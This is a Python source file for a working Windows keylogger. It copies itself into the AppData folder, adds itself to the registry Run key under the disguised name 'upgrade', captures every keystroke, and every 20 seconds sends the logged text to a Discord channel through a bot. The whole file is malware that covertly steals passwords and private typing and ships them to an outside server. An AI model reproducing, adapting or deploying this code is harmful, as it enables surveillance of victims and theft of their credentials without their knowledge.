import os
import shutil
import sys
import subprocess
from pynput import keyboard
import threading
import asyncio
import discord
from discord.ext import commands

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

# Discord bot events and functions
@bot.event
async def on_ready():
    print(f'Logged in as bot {bot.user}.')

async def send_incoming_message(message):
    await bot.wait_until_ready()  # Wait until the bot is ready.
    channel_id = 0000000000000000000  # Paste the channel ID here.
    channel = bot.get_channel(channel_id)
    if channel:
        print(f'Channel found.: {channel.name}')
        await channel.send(message)
        print('Message sent.')
    else:
        print('The specified channel could not be found.')

async def start_bot():
    await bot.start("YOUR-BOT-TOKEN")  #Use the bot token here.

#Function to add to Windows startup
def add_to_registr():
    new_file = os.environ["appdata"] + "\\keylogger.exe"
    new_text = os.environ["appdata"] + "\\keylogger.txt"
    if not os.path.exists(new_file):
        shutil.copyfile(sys.executable, new_file)
        shutil.copyfile(sys.executable, new_text)
        regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
        subprocess.call(regedit_command, shell=True)

add_to_registr()

# Keylogger variables and functions
text = ""
stop_flag = False

def callback_func(key):
    global text, stop_flag

    if key == keyboard.Key.esc:
        stop_flag = True
        return False
    else:
        try:
            if hasattr(key, 'char') and key.char is not None:
                text += key.char
            elif key == keyboard.Key.space:
                text += ' '
            elif key == keyboard.Key.enter:
                text += '\n'
            elif key == keyboard.Key.backspace:
                text = text[:-1]
        except AttributeError:
            pass

        with open(os.environ["appdata"] + "\\keylogger.txt", "w", encoding="utf-8") as file:
            file.write(text)

async def send_messages():
    global text, stop_flag
    while not stop_flag:
        with open(os.environ["appdata"] + "\\keylogger.txt", "r", encoding="utf-8") as file:
            icerik = file.read()
        if icerik.strip():
            print(icerik)
            await send_incoming_message(icerik)
            with open(os.environ["appdata"] + "\\keylogger.txt", "w", encoding="utf-8") as file:
                file.write("")
            text = ""
        await asyncio.sleep(20)

def start_listener():
    with keyboard.Listener(on_press=callback_func) as listener:
        listener.join()

#Starting the keylogger thread
listener_thread = threading.Thread(target=start_listener)
listener_thread.start()

# Starting asynchronous tasks
async def main():
    bot_task = asyncio.create_task(start_bot())
    message_task = asyncio.create_task(send_messages())
    await bot_task
    await message_task

asyncio.run(main())
